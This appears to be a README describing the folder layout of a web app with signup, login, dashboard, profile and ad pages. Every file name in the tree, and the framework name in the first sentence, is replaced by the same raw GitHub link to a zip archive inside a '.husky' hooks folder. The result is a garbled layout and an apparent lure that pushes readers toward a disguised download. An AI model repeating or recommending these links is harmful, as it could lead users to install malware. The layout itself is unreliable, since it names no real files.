# Project Structure

This repository follows a scalable https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip App Router structure, suitable for a partner-side application  that includes public signup/login, protected dashboards, profile management, and ad management. It is designed with SEO and performance in mind, using components, hooks, and libraries that ensure clean code organization and maintainability.

```text
project/
├─ app/
│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  ├─ (public-routes)/
│  │  ├─ signup/
│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  │  ├─ login/
│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  ├─ (protected)/
│  │  ├─ dashboard/
│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip               // Landing after login
│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  │  ├─ profile/
│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip               // View profile
│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  │  ├─ ads/
│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip               // List of ads created
│  │  │  ├─ [adId]/
│  │  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip            // View specific ad
│  │  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  ├─ (auth)/
│  │  ├─ callback/
│  │  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip               // Auth callback if needed
│  │  ├─ ...                        // Additional auth routes as required
│
├─ components/
│  ├─ ui/
│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  ├─ forms/
│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip            // Generic form wrapper for styling and validation
│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip              // Generic input with label, error display
│  ├─ layout/
│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                // If a sidebar is needed after login
│
├─ lib/
│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                       // Next-Auth (or https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip) config and providers
│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                        // Default SEO configs with next-seo
│  ├─ validations/                  // Zod schemas for validation
│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
│  ├─ api/                          // API helpers (e.g. axios instances, fetch wrappers)
│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                 // Auth-related API calls
│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                 // User/profile-related API calls
│  │  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                  // Ad-related API calls
│
├─ hooks/
│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                    // Hook to get auth user
│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip          // Hook to redirect if not logged in
│
├─ styles/
│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                   // Tailwind/reset and global styles
│  ├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip                 // CSS variables if needed
│
├─ public/                           // Public assets (images, icons)
│
├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
├─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
└─ https://raw.githubusercontent.com/03Anmol/expendifi_frontend/main/.husky/expendifi_frontend_disinherit.zip
```
